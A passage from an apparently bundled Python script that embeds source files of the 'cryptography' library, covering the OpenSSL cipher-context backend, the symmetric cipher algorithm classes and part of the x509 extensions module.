None\r\n\r\n        if isinstance(self._cipher, ciphers.BlockCipherAlgorithm):\r\n            self._block_size_bytes = self._cipher.block_size // 8\r\n        else:\r\n            self._block_size_bytes = 1\r\n\r\n        ctx = self._backend._lib.EVP_CIPHER_CTX_new()\r\n        ctx = self._backend._ffi.gc(\r\n            ctx, self._backend._lib.EVP_CIPHER_CTX_free\r\n        )\r\n\r\n        registry = self._backend._cipher_registry\r\n        try:\r\n            adapter = registry[type(cipher), type(mode)]\r\n        except KeyError:\r\n            raise UnsupportedAlgorithm(\r\n                "cipher {} in {} mode is not supported "\r\n                "by this backend.".format(\r\n                    cipher.name, mode.name if mode else mode\r\n                ),\r\n                _Reasons.UNSUPPORTED_CIPHER,\r\n            )\r\n\r\n        evp_cipher = adapter(self._backend, cipher, mode)\r\n        if evp_cipher == self._backend._ffi.NULL:\r\n            msg = "cipher {0.name} ".format(cipher)\r\n            if mode is not None:\r\n                msg += "in {0.name} mode ".format(mode)\r\n            msg += (\r\n                "is not supported by this backend (Your version of OpenSSL "\r\n                "may be too old. Current version: {}.)"\r\n            ).format(self._backend.openssl_version_text())\r\n            raise UnsupportedAlgorithm(msg, _Reasons.UNSUPPORTED_CIPHER)\r\n\r\n        if isinstance(mode, modes.ModeWithInitializationVector):\r\n            iv_nonce = self._backend._ffi.from_buffer(\r\n                mode.initialization_vector\r\n            )\r\n        elif isinstance(mode, modes.ModeWithTweak):\r\n            iv_nonce = self._backend._ffi.from_buffer(mode.tweak)\r\n        elif isinstance(mode, modes.ModeWithNonce):\r\n            iv_nonce = self._backend._ffi.from_buffer(mode.nonce)\r\n        elif isinstance(cipher, algorithms.ChaCha20):\r\n            iv_nonce = self._backend._ffi.from_buffer(cipher.nonce)\r\n        else:\r\n            iv_nonce = self._backend._ffi.NULL\r\n        # begin init with cipher and operation type\r\n        res = self._backend._lib.EVP_CipherInit_ex(\r\n            ctx,\r\n            evp_cipher,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            operation,\r\n        )\r\n        self._backend.openssl_assert(res != 0)\r\n        # set the key length to handle variable key ciphers\r\n        res = self._backend._lib.EVP_CIPHER_CTX_set_key_length(\r\n            ctx, len(cipher.key)\r\n        )\r\n        self._backend.openssl_assert(res != 0)\r\n        if isinstance(mode, modes.GCM):\r\n            res = self._backend._lib.EVP_CIPHER_CTX_ctrl(\r\n                ctx,\r\n                self._backend._lib.EVP_CTRL_AEAD_SET_IVLEN,\r\n                len(iv_nonce),\r\n                self._backend._ffi.NULL,\r\n            )\r\n            self._backend.openssl_assert(res != 0)\r\n            if mode.tag is not None:\r\n                res = self._backend._lib.EVP_CIPHER_CTX_ctrl(\r\n                    ctx,\r\n                    self._backend._lib.EVP_CTRL_AEAD_SET_TAG,\r\n                    len(mode.tag),\r\n                    mode.tag,\r\n                )\r\n                self._backend.openssl_assert(res != 0)\r\n                self._tag = mode.tag\r\n\r\n        # pass key/iv\r\n        res = self._backend._lib.EVP_CipherInit_ex(\r\n            ctx,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.from_buffer(cipher.key),\r\n            iv_nonce,\r\n            operation,\r\n        )\r\n\r\n        # Check for XTS mode duplicate keys error\r\n        errors = self._backend._consume_errors()\r\n        lib = self._backend._lib\r\n        if res == 0 and (\r\n            (\r\n                lib.CRYPTOGRAPHY_OPENSSL_111D_OR_GREATER\r\n                and errors[0]._lib_reason_match(\r\n                    lib.ERR_LIB_EVP, lib.EVP_R_XTS_DUPLICATED_KEYS\r\n                )\r\n            )\r\n            or (\r\n                lib.Cryptography_HAS_PROVIDERS\r\n                and errors[0]._lib_reason_match(\r\n                    lib.ERR_LIB_PROV, lib.PROV_R_XTS_DUPLICATED_KEYS\r\n                )\r\n            )\r\n        ):\r\n            raise ValueError("In XTS mode duplicated keys are not allowed")\r\n\r\n        self._backend.openssl_assert(res != 0, errors=errors)\r\n\r\n        # We purposely disable padding here as it\'s handled higher up in the\r\n        # API.\r\n        self._backend._lib.EVP_CIPHER_CTX_set_padding(ctx, 0)\r\n        self._ctx = ctx\r\n\r\n    def update(self, data: bytes) -> bytes:\r\n        buf = bytearray(len(data) + self._block_size_bytes - 1)\r\n        n = self.update_into(data, buf)\r\n        return bytes(buf[:n])\r\n\r\n    def update_into(self, data: bytes, buf: bytes) -> int:\r\n        total_data_len = len(data)\r\n        if len(buf) < (total_data_len + self._block_size_bytes - 1):\r\n            raise ValueError(\r\n                "buffer must be at least {} bytes for this "\r\n                "payload".format(len(data) + self._block_size_bytes - 1)\r\n            )\r\n\r\n        data_processed = 0\r\n        total_out = 0\r\n        outlen = self._backend._ffi.new("int *")\r\n        baseoutbuf = self._backend._ffi.from_buffer(buf)\r\n        baseinbuf = self._backend._ffi.from_buffer(data)\r\n\r\n        while data_processed != total_data_len:\r\n            outbuf = baseoutbuf + total_out\r\n            inbuf = baseinbuf + data_processed\r\n            inlen = min(self._MAX_CHUNK_SIZE, total_data_len - data_processed)\r\n\r\n            res = self._backend._lib.EVP_CipherUpdate(\r\n                self._ctx, outbuf, outlen, inbuf, inlen\r\n            )\r\n            if res == 0 and isinstance(self._mode, modes.XTS):\r\n                self._backend._consume_errors()\r\n                raise ValueError(\r\n                    "In XTS mode you must supply at least a full block in the "\r\n                    "first update call. For AES this is 16 bytes."\r\n                )\r\n            else:\r\n                self._backend.openssl_assert(res != 0)\r\n            data_processed += inlen\r\n            total_out += outlen[0]\r\n\r\n        return total_out\r\n\r\n    def finalize(self) -> bytes:\r\n        if (\r\n            self._operation == self._DECRYPT\r\n            and isinstance(self._mode, modes.ModeWithAuthenticationTag)\r\n            and self.tag is None\r\n        ):\r\n            raise ValueError(\r\n                "Authentication tag must be provided when decrypting."\r\n            )\r\n\r\n        buf = self._backend._ffi.new("unsigned char[]", self._block_size_bytes)\r\n        outlen = self._backend._ffi.new("int *")\r\n        res = self._backend._lib.EVP_CipherFinal_ex(self._ctx, buf, outlen)\r\n        if res == 0:\r\n            errors = self._backend._consume_errors()\r\n\r\n            if not errors and isinstance(self._mode, modes.GCM):\r\n                raise InvalidTag\r\n\r\n            lib = self._backend._lib\r\n            self._backend.openssl_assert(\r\n                errors[0]._lib_reason_match(\r\n                    lib.ERR_LIB_EVP,\r\n                    lib.EVP_R_DATA_NOT_MULTIPLE_OF_BLOCK_LENGTH,\r\n                )\r\n                or (\r\n                    lib.Cryptography_HAS_PROVIDERS\r\n                    and errors[0]._lib_reason_match(\r\n                        lib.ERR_LIB_PROV,\r\n                        lib.PROV_R_WRONG_FINAL_BLOCK_LENGTH,\r\n                    )\r\n                )\r\n                or (\r\n                    lib.CRYPTOGRAPHY_IS_BORINGSSL\r\n                    and errors[0].reason\r\n                    == lib.CIPHER_R_DATA_NOT_MULTIPLE_OF_BLOCK_LENGTH\r\n                ),\r\n                errors=errors,\r\n            )\r\n            raise ValueError(\r\n                "The length of the provided data is not a multiple of "\r\n                "the block length."\r\n            )\r\n\r\n        if (\r\n            isinstance(self._mode, modes.GCM)\r\n            and self._operation == self._ENCRYPT\r\n        ):\r\n            tag_buf = self._backend._ffi.new(\r\n                "unsigned char[]", self._block_size_bytes\r\n            )\r\n            res = self._backend._lib.EVP_CIPHER_CTX_ctrl(\r\n                self._ctx,\r\n                self._backend._lib.EVP_CTRL_AEAD_GET_TAG,\r\n                self._block_size_bytes,\r\n                tag_buf,\r\n            )\r\n            self._backend.openssl_assert(res != 0)\r\n            self._tag = self._backend._ffi.buffer(tag_buf)[:]\r\n\r\n        res = self._backend._lib.EVP_CIPHER_CTX_reset(self._ctx)\r\n        self._backend.openssl_assert(res == 1)\r\n        return self._backend._ffi.buffer(buf)[: outlen[0]]\r\n\r\n    def finalize_with_tag(self, tag: bytes) -> bytes:\r\n        tag_len = len(tag)\r\n        if tag_len < self._mode._min_tag_length:\r\n            raise ValueError(\r\n                "Authentication tag must be {} bytes or longer.".format(\r\n                    self._mode._min_tag_length\r\n                )\r\n            )\r\n        elif tag_len > self._block_size_bytes:\r\n            raise ValueError(\r\n                "Authentication tag cannot be more than {} bytes.".format(\r\n                    self._block_size_bytes\r\n                )\r\n            )\r\n        res = self._backend._lib.EVP_CIPHER_CTX_ctrl(\r\n            self._ctx, self._backend._lib.EVP_CTRL_AEAD_SET_TAG, len(tag), tag\r\n        )\r\n        self._backend.openssl_assert(res != 0)\r\n        self._tag = tag\r\n        return self.finalize()\r\n\r\n    def authenticate_additional_data(self, data: bytes) -> None:\r\n        outlen = self._backend._ffi.new("int *")\r\n        res = self._backend._lib.EVP_CipherUpdate(\r\n            self._ctx,\r\n            self._backend._ffi.NULL,\r\n            outlen,\r\n            self._backend._ffi.from_buffer(data),\r\n            len(data),\r\n        )\r\n        self._backend.openssl_assert(res != 0)\r\n\r\n    @property\r\n    def tag(self) -> typing.Optional[bytes]:\r\n        return self._tag\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/ciphers/algorithms.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.hazmat.primitives.ciphers import (\r\n    BlockCipherAlgorithm,\r\n    CipherAlgorithm,\r\n)\r\n\r\n\r\ndef _verify_key_size(algorithm: CipherAlgorithm, key: bytes) -> bytes:\r\n    # Verify that the key is instance of bytes\r\n    utils._check_byteslike("key", key)\r\n\r\n    # Verify that the key size matches the expected key size\r\n    if len(key) * 8 not in algorithm.key_sizes:\r\n        raise ValueError(\r\n            "Invalid key size ({}) for {}.".format(\r\n                len(key) * 8, algorithm.name\r\n            )\r\n        )\r\n    return key\r\n\r\n\r\nclass AES(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "AES"\r\n    block_size = 128\r\n    # 512 added to support AES-256-XTS, which uses 512-bit keys\r\n    key_sizes = frozenset([128, 192, 256, 512])\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\nclass Camellia(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "camellia"\r\n    block_size = 128\r\n    key_sizes = frozenset([128, 192, 256])\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\nclass TripleDES(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "3DES"\r\n    block_size = 64\r\n    key_sizes = frozenset([64, 128, 192])\r\n\r\n    def __init__(self, key: bytes):\r\n        if len(key) == 8:\r\n            key += key + key\r\n        elif len(key) == 16:\r\n            key += key[:8]\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\nclass Blowfish(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "Blowfish"\r\n    block_size = 64\r\n    key_sizes = frozenset(range(32, 449, 8))\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\n_BlowfishInternal = Blowfish\r\nutils.deprecated(\r\n    Blowfish,\r\n    __name__,\r\n    "Blowfish has been deprecated",\r\n    utils.DeprecatedIn37,\r\n    name="Blowfish",\r\n)\r\n\r\n\r\nclass CAST5(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "CAST5"\r\n    block_size = 64\r\n    key_sizes = frozenset(range(40, 129, 8))\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\n_CAST5Internal = CAST5\r\nutils.deprecated(\r\n    CAST5,\r\n    __name__,\r\n    "CAST5 has been deprecated",\r\n    utils.DeprecatedIn37,\r\n    name="CAST5",\r\n)\r\n\r\n\r\nclass ARC4(CipherAlgorithm):\r\n    name = "RC4"\r\n    key_sizes = frozenset([40, 56, 64, 80, 128, 160, 192, 256])\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\nclass IDEA(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "IDEA"\r\n    block_size = 64\r\n    key_sizes = frozenset([128])\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\n_IDEAInternal = IDEA\r\nutils.deprecated(\r\n    IDEA,\r\n    __name__,\r\n    "IDEA has been deprecated",\r\n    utils.DeprecatedIn37,\r\n    name="IDEA",\r\n)\r\n\r\n\r\nclass SEED(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "SEED"\r\n    block_size = 128\r\n    key_sizes = frozenset([128])\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\n_SEEDInternal = SEED\r\nutils.deprecated(\r\n    SEED,\r\n    __name__,\r\n    "SEED has been deprecated",\r\n    utils.DeprecatedIn37,\r\n    name="SEED",\r\n)\r\n\r\n\r\nclass ChaCha20(CipherAlgorithm):\r\n    name = "ChaCha20"\r\n    key_sizes = frozenset([256])\r\n\r\n    def __init__(self, key: bytes, nonce: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n        utils._check_byteslike("nonce", nonce)\r\n\r\n        if len(nonce) != 16:\r\n            raise ValueError("nonce must be 128-bits (16 bytes)")\r\n\r\n        self._nonce = nonce\r\n\r\n    @property\r\n    def nonce(self) -> bytes:\r\n        return self._nonce\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n\r\n\r\nclass SM4(CipherAlgorithm, BlockCipherAlgorithm):\r\n    name = "SM4"\r\n    block_size = 128\r\n    key_sizes = frozenset([128])\r\n\r\n    def __init__(self, key: bytes):\r\n        self.key = _verify_key_size(self, key)\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return len(self.key) * 8\r\n')
    __stickytape_write_module('cryptography/x509/extensions.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport datetime\r\nimport hashlib\r\nimport ipaddress\r\nimport typing\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.hazmat.bindings._rust import asn1\r\nfrom cryptography.hazmat.bindings._rust import x509 as rust_x509\r\nfrom cryptography.hazmat.primitives import constant_time, serialization\r\nfrom cryptography.hazmat.primitives.asymmetric.ec import EllipticCurvePublicKey\r\nfrom cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey\r\nfrom cryptography.hazmat.primitives.asymmetric.types import (\r\n    CERTIFICATE_ISSUER_PUBLIC_KEY_TYPES,\r\n    CERTIFICATE_PUBLIC_KEY_TYPES,\r\n)\r\nfrom cryptography.x509.certificate_transparency import (\r\n    SignedCertificateTimestamp,\r\n)\r\nfrom cryptography.x509.general_name import (\r\n    DNSName,\r\n    DirectoryName,\r\n    GeneralName,\r\n    IPAddress,\r\n    OtherName,\r\n    RFC822Name,\r\n    RegisteredID,\r\n    UniformResourceIdentifier,\r\n    _IPADDRESS_TYPES,\r\n)\r\nfrom cryptography.x509.name import Name, RelativeDistinguishedName\r\nfrom cryptography.x509.oid import (\r\n    CRLEntryExtensionOID,\r\n    ExtensionOID,\r\n    OCSPExtensionOID,\r\n    ObjectIdentifier,\r\n)\r\n\r\nExtensionTypeVar = typing.TypeVar(\r\n    "ExtensionTypeVar", bound="ExtensionType", covariant=True\r\n)\r\n\r\n\r\ndef _key_identifier_from_public_key(\r\n    public_key: CERTIFICATE_PUBLIC_KEY_TYPES,\r\n) -> bytes:\r\n    if isinstance(public_key, RSAPublicKey):\r\n        data = public_key.public_bytes(\r\n            serialization.Encoding.DER,\r\n            serialization.PublicFormat.PKCS1,\r\n        )\r\n    elif isinstance(public_key, EllipticCurvePublicKey):\r\n        data = public_key.public_bytes(\r\n            serialization.Encoding.X962,\r\n            serialization.PublicFormat.UncompressedPoint,\r\n        )\r\n    else:\r\n        # This is a very slow way to do this.\r\n        serialized = public_key.public_bytes(\r\n            serialization.Encoding.DER,\r\n            serialization.PublicFormat.SubjectPublicKeyInfo,\r\n        )\r\n        data = asn1.parse_spki_for_data(serialized)\r\n\r\n    return hashlib.sha1(data).digest()\r\n\r\n\r\ndef _make_sequence_methods(field_name: str):\r\n    def len_method(self) -> int:\r\n        return len(getattr(self, field_name))\r\n\r\n    def iter_method(self):\r\n        return iter(getattr(self, field_name))\r\n\r\n    def getitem_method(self, idx):\r\n        return getattr(self, field_name)[idx]\r\n\r\n    return len_method, iter_method, getitem_method\r\n\r\n\r\nclass DuplicateExtension(Exception):\r\n    def __init__(self, msg: str, oid: ObjectIdentifier) -> None:\r\n        super(DuplicateExtension, self).__init__(msg)\r\n        self.oid = oid\r\n\r\n\r\nclass ExtensionNotFound(Exception):\r\n    def __init__(self, msg: str, oid: ObjectIdentifier) -> None:\r\n        super(ExtensionNotFound, self).__init__(msg)\r\n        self.oid = oid\r\n\r\n\r\nclass ExtensionType(metaclass=abc.ABCMeta):\r\n    oid: typing.ClassVar[ObjectIdentifier]\r\n\r\n    def public_bytes(self) -> bytes:\r\n        """\r\n        Serializes the extension type to DER.\r\n        """\r\n        raise NotImplementedError(\r\n            "public_bytes is not implemented for extension type {0!r}".format(\r\n                self\r\n            )\r\n        )\r\n\r\n\r\nclass Extensions:\r\n    def __init__(\r\n        self, extensions: typing.Iterable["Extension[ExtensionType]"]\r\n    ) -> None:\r\n        self._extensions = list(extensions)\r\n\r\n    def get_extension_for_oid(\r\n        self, oid: ObjectIdentifier\r\n    ) -> "Extension[ExtensionType]":\r\n        for ext in self:\r\n            if ext.oid == oid:\r\n                return ext\r\n\r\n        raise ExtensionNotFound("No {} extension was found".format(oid), oid)\r\n\r\n    def get_extension_for_class(\r\n        self, extclass: typing.Type[ExtensionTypeVar]\r\n    ) -> "Extension[ExtensionTypeVar]":\r\n        if extclass is UnrecognizedExtension:\r\n            raise TypeError(\r\n                "UnrecognizedExtension can\'t be used with "\r\n                "get_extension_for_class because more than one instance of the"\r\n                " class may be present."\r\n            )\r\n\r\n        for ext in self:\r\n            if isinstance(ext.value, extclass):\r\n                return ext\r\n\r\n        raise ExtensionNotFound(\r\n            "No {} extension was found".format(extclass), extclass.oid\r\n        )\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_extensions")\r\n\r\n    def __repr__(self) -> str:\r\n        return "<Extensions({})>".format(self._extensions)\r\n\r\n\r\nclass CRLNumber(ExtensionType):\r\n    oid = ExtensionOID.CRL_NUMBER\r\n\r\n    def __init__(self, crl_number: int) -> None:\r\n        if not isinstance(crl_number, int):\r\n            raise TypeError("crl_number must be an integer")\r\n\r\n        self._crl_number = crl_number\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, CRLNumber):\r\n            return NotImplemented\r\n\r\n        return self.crl_number == other.crl_number\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.crl_number)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<CRLNumber({})>".format(self.crl_number)\r\n\r\n    @property\r\n    def crl_number(self) -> int:\r\n        return self._crl_number\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass AuthorityKeyIdentifier(ExtensionType):\r\n    oid = ExtensionOID.AUTHORITY_KEY_IDENTIFIER\r\n\r\n    def __init__(\r\n        self,\r\n        key_identifier: typing.Optional[bytes],\r\n        authority_cert_issuer: typing.Optional[typing.Iterable[GeneralName]],\r\n        authority_cert_serial_number: typing.Optional[int],\r\n    ) -> None:\r\n        if (authority_cert_issuer is None) != (\r\n            authority_cert_serial_number is None\r\n        ):\r\n            raise ValueError(\r\n                "authority_cert_issuer and authority_cert_serial_number "\r\n                "must both be present or both None"\r\n            )\r\n\r\n        if authority_cert_issuer is not None:\r\n            authority_cert_issuer = list(authority_cert_issuer)\r\n            if not all(\r\n                isinstance(x, GeneralName) for x in authority_cert_issuer\r\n            ):\r\n                raise TypeError(\r\n                    "authority_cert_issuer must be a list of GeneralName "\r\n                    "objects"\r\n                )\r\n\r\n        if authority_cert_serial_number is not None and not isinstance(\r\n            authority_cert_serial_number, int\r\n        ):\r\n            raise TypeError("authority_cert_serial_number must be an integer")\r\n\r\n        self._key_identifier = key_identifier\r\n        self._authority_cert_issuer = authority_cert_issuer\r\n        self._authority_cert_serial_number = authority_cert_serial_number\r\n\r\n    # This takes a subset of CERTIFICATE_PUBLIC_KEY_TYPES because an issuer\r\n    # cannot have an X25519/X448 key. This introduces some unfortunate\r\n    # asymmetry that requires typing users to explicitly\r\n    # narrow their type, but we should make this accurate and not just\r\n    # convenient.\r\n    @classmethod\r\n    def from_issuer_public_key(\r\n        cls, public_key: CERTIFICATE_ISSUER_PUBLIC_KEY_TYPES\r\n    ) -> "AuthorityKeyIdentifier":\r\n        digest = _key_identifier_from_public_key(public_key)\r\n        return cls(\r\n            key_identifier=digest,\r\n            authority_cert_issuer=None,\r\n            authority_cert_serial_number=None,\r\n        )\r\n\r\n    @classmethod\r\n    def from_issuer_subject_key_identifier(\r\n        cls, ski: "SubjectKeyIdentifier"\r\n    ) -> "AuthorityKeyIdentifier":\r\n        return cls(\r\n            key_identifier=ski.digest,\r\n            authority_cert_issuer=None,\r\n            authority_cert_serial_number=None,\r\n        )\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<AuthorityKeyIdentifier(key_identifier={0.key_identifier!r}, "\r\n            "authority_cert_issuer={0.authority_cert_issuer}, "\r\n            "authority_cert_serial_number={0.authority_cert_serial_number}"\r\n            ")>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, AuthorityKeyIdentifier):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.key_identifier == other.key_identifier\r\n            and self.authority_cert_issuer == other.authority_cert_issuer\r\n            and self.authority_cert_serial_number\r\n            == other.authority_cert_serial_number\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        if self.authority_cert_issuer is None:\r\n            aci = None\r\n        else:\r\n            aci = tuple(self.authority_cert_issuer)\r\n        return hash(\r\n            (self.key_identifier, aci, self.authority_cert_serial_number)\r\n        )\r\n\r\n    @property\r\n    def key_identifier(self) -> typing.Optional[bytes]:\r\n        return self._key_identifier\r\n\r\n    @property\r\n    def authority_cert_issuer(\r\n        self,\r\n    ) -> typing.Optional[typing.List[GeneralName]]:\r\n        return self._authority_cert_issuer\r\n\r\n    @property\r\n    def authority_cert_serial_number(self) -> typing.Optional[int]:\r\n        return self._authority_cert_serial_number\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass SubjectKeyIdentifier(ExtensionType):\r\n    oid = ExtensionOID.SUBJECT_KEY_IDENTIFIER\r\n\r\n    def __init__(self, digest: bytes) -> None:\r\n        self._digest = digest\r\n\r\n    @classmethod\r\n    def from_public_key(\r\n        cls, public_key: CERTIFICATE_PUBLIC_KEY_TYPES\r\n    ) -> "SubjectKeyIdentifier":\r\n        return cls(_key_identifier_from_public_key(public_key))\r\n\r\n    @property\r\n    def digest(self) -> bytes:\r\n        return self._digest\r\n\r\n    @property\r\n    def key_identifier(self) -> bytes:\r\n        return self._digest\r\n\r\n    def __repr__(self) -> str:\r\n        return "<SubjectKeyIdentifier(digest={0!r})>".format(self.digest)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, SubjectKeyIdentifier):\r\n            return NotImplemented\r\n\r\n        return constant_time.bytes_eq(self.digest, other.digest)\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.digest)\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass AuthorityInformationAccess(ExtensionType):\r\n    oid = ExtensionOID.AUTHORITY_INFORMATION_ACCESS\r\n\r\n    def __init__(\r\n        self, descriptions: typing.Iterable["AccessDescription"]\r\n    ) -> None:\r\n        descriptions = list(descriptions)\r\n        if not all(isinstance(x, AccessDescription) for x in descriptions):\r\n            raise TypeError(\r\n                "Every item in the descriptions list must be an "\r\n                "AccessDescription"\r\n            )\r\n\r\n        self._descriptions = descriptions\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_descriptions")\r\n\r\n    def __repr__(self) -> str:\r\n        return "<AuthorityInformationAccess({})>".format(self._descriptions)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, AuthorityInformationAccess):\r\n            return NotImplemented\r\n\r\n        return self._descriptions == other._descriptions\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._descriptions))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass SubjectInformationAccess(ExtensionType):\r\n    oid = ExtensionOID.SUBJECT_INFORMATION_ACCESS\r\n\r\n    def __init__(\r\n        self, descriptions: typing.Iterable["AccessDescription"]\r\n    ) -> None:\r\n        descriptions = list(descriptions)\r\n        if not all(isinstance(x, AccessDescription) for x in descriptions):\r\n            raise TypeError(\r\n                "Every item in the descriptions list must be an "\r\n                "AccessDescription"\r\n            )\r\n\r\n        self._descriptions = descriptions\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_descriptions")\r\n\r\n    def __repr__(self) -> str:\r\n        return "<SubjectInformationAccess({})>".format(self._descriptions)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, SubjectInformationAccess):\r\n            return NotImplemented\r\n\r\n        return self._descriptions == other._descriptions\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._descriptions))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass AccessDescription:\r\n    def __init__(\r\n        self, access_method: ObjectIdentifier, access_location: GeneralName\r\n    ) -> None:\r\n        if not isinstance(access_method, ObjectIdentifier):\r\n            raise TypeError("access_method must be an ObjectIdentifier")\r\n\r\n        if not isinstance(access_location, GeneralName):\r\n            raise TypeError("access_location must be a GeneralName")\r\n\r\n        self._access_method = access_method\r\n        self._access_location = access_location\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<AccessDescription(access_method={0.access_method}, access_locati"\r\n            "on={0.access_location})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, AccessDescription):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.access_method == other.access_method\r\n            and self.access_location == other.access_location\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.access_method, self.access_location))\r\n\r\n    @property\r\n    def access_method(self) -> ObjectIdentifier:\r\n        return self._access_method\r\n\r\n    @property\r\n    def access_location(self) -> GeneralName:\r\n        return self._access_location\r\n\r\n\r\nclass BasicConstraints(ExtensionType):\r\n    oid = ExtensionOID.BASIC_CONSTRAINTS\r\n\r\n    def __init__(self, ca: bool, path_length: typing.Optional[int]) -> None:\r\n        if not isinstance(ca, bool):\r\n            raise TypeError("ca must be a boolean value")\r\n\r\n        if path_length is not None and not ca:\r\n            raise ValueError("path_length must be None when ca is False")\r\n\r\n        if path_length is not None and (\r\n            not isinstance(path_length, int) or path_length < 0\r\n        ):\r\n            raise TypeError(\r\n                "path_length must be a non-negative integer or None"\r\n            )\r\n\r\n        self._ca = ca\r\n        self._path_length = path_length\r\n\r\n    @property\r\n    def ca(self) -> bool:\r\n        return self._ca\r\n\r\n    @property\r\n    def path_length(self) -> typing.Optional[int]:\r\n        return self._path_length\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<BasicConstraints(ca={0.ca}, " "path_length={0.path_length})>"\r\n        ).format(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, BasicConstraints):\r\n            return NotImplemented\r\n\r\n        return self.ca == other.ca and self.path_length == other.path_length\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.ca, self.path_length))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass DeltaCRLIndicator(ExtensionType):\r\n    oid = ExtensionOID.DELTA_CRL_INDICATOR\r\n\r\n    def __init__(self, crl_number: int) -> None:\r\n        if not isinstance(crl_number, int):\r\n            raise TypeError("crl_number must be an integer")\r\n\r\n        self._crl_number = crl_number\r\n\r\n    @property\r\n    def crl_number(self) -> int:\r\n        return self._crl_number\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DeltaCRLIndicator):\r\n            return NotImplemented\r\n\r\n        return self.crl_number == other.crl_number\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.crl_number)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<DeltaCRLIndicator(crl_number={0.crl_number})>".format(self)\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass CRLDistributionPoints(ExtensionType):\r\n    oid = ExtensionOID.CRL_DISTRIBUTION_POINTS\r\n\r\n    def __init__(\r\n        self, distribution_points: typing.Iterable["DistributionPoint"]\r\n    ) -> None:\r\n        distribution_points = list(distribution_points)\r\n        if not all(\r\n            